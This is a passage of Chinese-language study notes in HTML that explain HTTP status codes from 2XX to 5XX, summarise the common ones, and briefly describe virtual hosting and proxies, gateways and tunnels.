<td>&emsp;&emsp;服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。<br>&emsp;&emsp;返回 202 状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回 202 状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td>
</tr>
<tr>
<td>203</td>
<td>Non-Authoritative Information</td>
<td>&emsp;&emsp;服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回 200 OK 的情况下才是合适的。</td>
</tr>
<tr>
<td>204</td>
<td>No Content</td>
<td>&emsp;&emsp;服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。<br>&emsp;&emsp;如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。<br>&emsp;&emsp;由于 204 响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</td>
</tr>
<tr>
<td>205</td>
<td>Reset Content</td>
<td>&emsp;&emsp;服务器成功处理了请求，且没有返回任何内容。但是与 204 响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。<br>&emsp;&emsp;与 204 响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</td>
</tr>
<tr>
<td>206</td>
<td>Partial Content</td>
<td>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。<br>&emsp;&emsp;该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。<br>&emsp;&emsp;响应必须包含如下的头部域：<br>&emsp;&emsp;1、<code>Content-Range</code>用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。<br>&emsp;&emsp;2、<code>Date</code><br>&emsp;&emsp;3、<code>ETag</code>和/或<code>Content-Location</code>，假如同样的请求本应该返回 200 响应。<br>&emsp;&emsp;4、<code>Expires</code>，<code>Cache-Control</code>和/或 <code>Vary</code>，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>&emsp;&emsp;假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回 200 响应中应当返回的所有实体头部域。<br>&emsp;&emsp;假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将 206 响应返回的内容与之前任何缓存过的内容组合在一起。</td>
</tr>
<tr>
<td>207</td>
<td>Multi-Status</td>
<td>&emsp;&emsp;由 WebDAV(RFC 2518) 扩展的状态码，代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td>
</tr>
</tbody></table>
<hr>
<p><strong>3XX 重定向</strong><br>&emsp;&emsp;这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。<br>&emsp;&emsp;当且仅当后续的请求所使用的方法是 GET 或者 HEAD 时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A -&gt; A，或者 A -&gt; B -&gt; C -&gt; A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过 5 次的重定向。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>语义</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>300</td>
<td>Multiple Choices</td>
<td>&emsp;&emsp;被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。<br>&emsp;&emsp;除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616 规范并没有规定这样的自动选择该如何进行。<br>&emsp;&emsp;如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently</td>
<td>&emsp;&emsp;被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。<br>&emsp;&emsp;新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。<br>&emsp;&emsp;如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>&emsp;&emsp;注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个 301 响应的话，接下来的重定向请求将会变成 GET 方式。</td>
</tr>
<tr>
<td>302</td>
<td>Move Temporarily</td>
<td>&emsp;&emsp;请求的资源临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的。<br>&emsp;&emsp;上文有提及。如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br>&emsp;&emsp;注意：虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视作为 303 响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码 303 和 307 被添加了进来，用以明确服务器期待客户端进行何种反应。</td>
</tr>
<tr>
<td>303</td>
<td>See Other</td>
<td>&emsp;&emsp;对应当前请求的响应可以在另一个 URL 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303 响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。<br>&emsp;&emsp;注意：许多 HTTP/1.1 版以前的浏览器不能正确理解 303 状态。如果需要考虑与这些浏览器之间的互动，302 状态码应该可以胜任，因为大多数的浏览器处理 302 响应时的方式恰恰就是上述规范要求客户端处理 303 响应时应当做的。</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified</td>
<td>&emsp;&emsp;如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。<br>&emsp;&emsp;该响应必须包含以下的头信息：<br>&emsp;&emsp;1、<code>Date</code>，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如 RFC 2068 中规定的一样），缓存机制将会正常工作。<br>&emsp;&emsp;2、<code>ETag</code>和/或<code>Content-Location</code>，假如同样的请求本应返回 200 响应。<br>&emsp;&emsp;3、<code>Expires</code>，<code>Cache-Control</code>和/或<code>Vary</code>，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>&emsp;&emsp;假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。<br>&emsp;&emsp;假如某个 304 响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。<br>&emsp;&emsp;假如接收到一个要求更新某个缓存条目的 304 响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。</td>
</tr>
<tr>
<td>305</td>
<td>Use Proxy</td>
<td>&emsp;&emsp;被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立 305 响应。<br>&emsp;&emsp;注意：RFC 2068 中没有明确 305 响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</td>
</tr>
<tr>
<td>306</td>
<td>Switch Proxy</td>
<td>&emsp;&emsp;在最新版的规范中，306 状态码已经不再被使用。</td>
</tr>
<tr>
<td>307</td>
<td>Temporary Redirect</td>
<td>&emsp;&emsp;请求的资源临时从不同的 URI 响应请求。<br>&emsp;&emsp;新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。因为部分浏览器不能识别 307 响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。<br>&emsp;&emsp;如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td>
</tr>
</tbody></table>
<hr>
<p><strong>4XX 请求错误</strong><br>&emsp;&emsp;这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个 HEAD 请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。<br>&emsp;&emsp;如果错误发生时客户端正在传送数据，那么使用 TCP 的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的 TCP 栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>语义</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>400</td>
<td>Bad Request</td>
<td>&emsp;&emsp;1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。<br>&emsp;&emsp;2、请求参数有误。</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized</td>
<td>&emsp;&emsp;当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么 401 响应代表着服务器验证已经拒绝了那些证书。如果 401 响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见 RFC 2617。</td>
</tr>
<tr>
<td>402</td>
<td>Payment Required</td>
<td>&emsp;&emsp;该状态码是为了将来可能的需求而预留的。</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden</td>
<td>&emsp;&emsp;服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>&emsp;&emsp;请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用 410 状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404 这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。出现这个错误的最有可能的原因是服务器端没有这个页面。</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed</td>
<td>&emsp;&emsp;请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。<br>&emsp;&emsp;鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回 405 错误。</td>
</tr>
<tr>
<td>406</td>
<td>Not Acceptable</td>
<td>&emsp;&emsp;请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。<br>&emsp;&emsp;除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</td>
</tr>
<tr>
<td>407</td>
<td>Proxy Authentication Required</td>
<td>&emsp;&emsp;与 401 响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见 RFC 2617。</td>
</tr>
<tr>
<td>408</td>
<td>Request Timeout</td>
<td>&emsp;&emsp;请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</td>
</tr>
<tr>
<td>409</td>
<td>Conflict</td>
<td>&emsp;&emsp;由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。<br>&emsp;&emsp;冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个 409 错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。</td>
</tr>
<tr>
<td>410</td>
<td>Gone</td>
<td>&emsp;&emsp;被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用 404 状态码。除非额外说明，否则这个响应是可缓存的。<br>&emsp;&emsp;410 响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410 响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为 ‘410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。</td>
</tr>
<tr>
<td>411</td>
<td>Length Required</td>
<td>&emsp;&emsp;服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</td>
</tr>
<tr>
<td>412</td>
<td>Precondition Failed</td>
<td>&emsp;&emsp;服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</td>
</tr>
<tr>
<td>413</td>
<td>Request Entity Too Large</td>
<td>&emsp;&emsp;服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。<br>&emsp;&emsp;如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</td>
</tr>
<tr>
<td>414</td>
<td>Request-URI Too Long</td>
<td>&emsp;&emsp;请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：<br>&emsp;&emsp;本应使用POST方法的表单提交变成了 GET 方法，导致查询字符串（Query String）过长。<br>&emsp;&emsp;重定向 URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。<br>&emsp;&emsp;客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回 414 状态码。</td>
</tr>
<tr>
<td>415</td>
<td>Unsupported Media Type</td>
<td>&emsp;&emsp;对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</td>
</tr>
<tr>
<td>416</td>
<td>Requested Range Not Satisfiable</td>
<td>&emsp;&emsp;如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回 416 状态码。<br>&emsp;&emsp;假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回 416 状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。</td>
</tr>
<tr>
<td>417</td>
<td>Expectation Failed</td>
<td>&emsp;&emsp;在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</td>
</tr>
<tr>
<td>418</td>
<td>I’m a teapot</td>
<td></td>
</tr>
<tr>
<td>421</td>
<td>Too Many Connections</td>
<td>&emsp;&emsp;There are too many connections from your internet address. <br>&emsp;&emsp;从当前客户端所在的 IP 地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的 IP 地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</td>
</tr>
<tr>
<td>422</td>
<td>Unprocessable Entity</td>
<td>&emsp;&emsp;请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）</td>
</tr>
<tr>
<td>423</td>
<td>Locked</td>
<td>&emsp;&emsp;当前资源被锁定。（RFC 4918 WebDAV）</td>
</tr>
<tr>
<td>424</td>
<td>Failed Dependency</td>
<td>&emsp;&emsp;由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）</td>
</tr>
<tr>
<td>425</td>
<td>Too Early</td>
<td>&emsp;&emsp;状态码 425 Too Early 代表服务器不愿意冒风险来处理该请求，原因是处理该请求可能会被“重放”，从而造成潜在的重放攻击。（RFC 8470） [1]</td>
</tr>
<tr>
<td>426</td>
<td>Upgrade Required</td>
<td>&emsp;&emsp;客户端应当切换到 TLS/1.0。（RFC 2817）</td>
</tr>
<tr>
<td>449</td>
<td>Retry With</td>
<td>&emsp;&emsp;由微软扩展，代表请求应当在执行完适当的操作后进行重试。</td>
</tr>
<tr>
<td>451</td>
<td>Unavailable For Legal Reasons</td>
<td>&emsp;&emsp;该请求因法律原因不可用。（RFC 7725）</td>
</tr>
</tbody></table>
<hr>
<p><strong>5XX, 600 服务器错误</strong><br>&emsp;&emsp;这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个 HEAD 请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。<br>这些状态码适用于任何响应方法。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>语义</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>500</td>
<td>Internal Server Error</td>
<td>&emsp;&emsp;服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器端的源代码出现错误时出现。</td>
</tr>
<tr>
<td>501</td>
<td>Not Implemented</td>
<td>&emsp;&emsp;服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway</td>
<td>&emsp;&emsp;作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</td>
</tr>
<tr>
<td>503</td>
<td>Service Unavailable</td>
<td>&emsp;&emsp;由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理 500 响应的方式处理它。<br>&emsp;&emsp;注意：503 状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</td>
</tr>
<tr>
<td>504</td>
<td>Gateway Timeout</td>
<td>&emsp;&emsp;作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI 标识出的服务器，例如 HTTP、FTP、LDAP）或者辅助服务器（例如 DNS）收到响应。<br>&emsp;&emsp;注意：某些代理服务器在 DNS 查询超时时会返回 400 或者 500 错误</td>
</tr>
<tr>
<td>505</td>
<td>HTTP Version Not Supported</td>
<td>&emsp;&emsp;服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</td>
</tr>
<tr>
<td>506</td>
<td>Variant Also Negotiates</td>
<td>&emsp;&emsp;由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</td>
</tr>
<tr>
<td>507</td>
<td>Insufficient Storage</td>
<td>&emsp;&emsp;服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。（RFC 4918 WebDAV)</td>
</tr>
<tr>
<td>509</td>
<td>Bandwidth Limit Exceeded</td>
<td>&emsp;&emsp;服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td>
</tr>
<tr>
<td>510</td>
<td>Not Extended</td>
<td>&emsp;&emsp;获取资源所需要的策略并没有被满足。（RFC 2774）</td>
</tr>
<tr>
<td>600</td>
<td>Unparseable Response Headers</td>
<td>&emsp;&emsp;源站没有返回响应头部，只返回实体内容。</td>
</tr>
</tbody></table>
</blockquote>
<h3 id="2XX-成功"><a href="#2XX-成功" class="headerlink" title="2XX 成功"></a>2XX 成功</h3><ul>
<li><p>200 OK<br>&emsp;&emsp;表示从客户端发来的请求在服务器端被正常处理了。</p>
</li>
<li><p>204 No Content<br>&emsp;&emsp;表示请求处理成功，但没有资源可以返回（响应报文中并没有主体资源，或者并不允许返回任何资源）。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。</p>
<blockquote>
<p>&emsp;&emsp;一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
</blockquote>
</li>
<li><p>206 Partial Content<br>&emsp;&emsp;该状态码表示客户端进行了<strong>范围请求</strong>，而服务器<strong>成功执行了这部分的 GET 请求</strong>。响应报文中包含由<code>Content-Range</code>指定范围的实体内容。</p>
</li>
</ul>
<h3 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h3><p>3XX 响应结果表明<strong>浏览器需要执行某些特殊的处理</strong>以正确处理请求。</p>
<ul>
<li>301 永久性重定向<br>&emsp;&emsp;该状态码表示<strong>请求的资源已被分配了新的URI</strong>，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按<code>Location</code>首部字段提示的 URI 重新保存。</li>
<li>302 临时性重定向<br>&emsp;&emsp;该状态码表示<strong>请求的资源已被分配了新的 URI</strong>，希望用户（本次）能使用新的 URI 访问。<br>&emsp;&emsp;和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。</li>
<li>303 See Other<br>&emsp;&emsp;该状态码表示由于请求对应的资源存在着另一个 URI，应使用 <strong>GET 方法</strong>定向获取请求的资源。<br>&emsp;&emsp;303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码<strong>明确表示客户端应当采用 GET 方法获取资源</strong>，这点与 302 状态码有区别。<br>&emsp;&emsp;比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303 状态码是最理想的。</li>
<li>304 Not Modified<br>&emsp;&emsp;该状态码表示客户端<strong>发送附带条件的请求</strong>时，服务器端允许请求访问资源，但因发生<strong>请求未满足条件</strong>的情况后，直接返回 304 Not Modified。<br>&emsp;&emsp;<strong>304 状态码返回时，不包含任何响应的主体部分。</strong>304 虽然被划分在 3XX 类别中，但是和重定向没有关系。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;附带条件的请求是指采用 GET 方法的请求报文中包含<code>if-Match</code>，<code>if-Modified-Since</code>，<code>if-None-Match</code>，<code>if-Range</code>，<code>if-Unmodified-Since</code>中任一首部。</p>
</blockquote>
<blockquote>
<p>&emsp;&emsp;当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送。301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做。</p>
</blockquote>
<h3 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h3><p>4XX 的响应结果表明客户端是发生错误的原因所在。</p>
<ul>
<li><p>400 Bad Request<br>&emsp;&emsp;状态码表示<strong>请求报文中存在语法错误</strong>。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。</p>
</li>
<li><p>401 Unauthorized<br>&emsp;&emsp;该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</p>
<ul>
<li>若第一次返回 401，会弹出认证的对话框。</li>
<li>第二次返回 401，表示认证失败。</li>
</ul>
</li>
<li><p>403 Forbidden<br>&emsp;&emsp;该状态码表明<strong>对请求资源的访问被服务器拒绝了</strong>。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。</p>
<blockquote>
<p>&emsp;&emsp;未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP地址试图访问）等列举的情况都可能是发生 403 的原因。</p>
</blockquote>
</li>
<li><p>404 Not Found<br>&emsp;&emsp;该状态码表明服务器上<strong>无法找到请求的资源</strong>。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
</li>
</ul>
<h3 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h3><p>5XX 的响应结果表明服务器本身发生错误。</p>
<ul>
<li>500 Internal Server Error<br>&emsp;&emsp;该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。</li>
<li>503 Service Unavailable<br>&emsp;&emsp;该状态码表明<strong>服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</strong>。如果事先得知解除以上状况需要的时间，最好写入<code>Retry-After</code>首部字段再返回给客户端。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种情况也经常遇到。</p>
</blockquote>
<h2 id="Web-服务器"><a href="#Web-服务器" class="headerlink" title="Web 服务器"></a>Web 服务器</h2><p>&emsp;&emsp;一台 Web 服务器可搭建多个独立域名的 Web 网站，也可作为通信路径上的中转度武器提升传输效率。</p>
<h3 id="用单台虚拟主机实现多个域名"><a href="#用单台虚拟主机实现多个域名" class="headerlink" title="用单台虚拟主机实现多个域名"></a>用单台虚拟主机实现多个域名</h3><p>&emsp;&emsp;HTTP/1.1 规范允许一台HTTP服务器搭建多个 Web 站点。即一个服务器可以为每位客户持有的域名<strong>运行各自不同的网站</strong>。这是因为利用了虚拟主机的功能。<br>&emsp;&emsp;即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器。</p>
<blockquote>
<p>&emsp;&emsp;若<code>www.baidu.com/</code>和<code>www.cctv.com/</code>同时部署在同一个服务器上，使用 DNS 解析域名后，两者的访问 IP 地址会相同。</p>
</blockquote>
<p>&emsp;&emsp;在相同的 IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。</p>
<h3 id="通信数据转发"><a href="#通信数据转发" class="headerlink" title="通信数据转发"></a>通信数据转发</h3><p>&emsp;&emsp;HTTP 通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如<strong>代理</strong>、<strong>网关</strong>和<strong>隧道</strong>。它们可以配合服务器工作。<br>&emsp;&emsp;这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且能接收从那台服务器发送的响应再转发给客户端。</p>
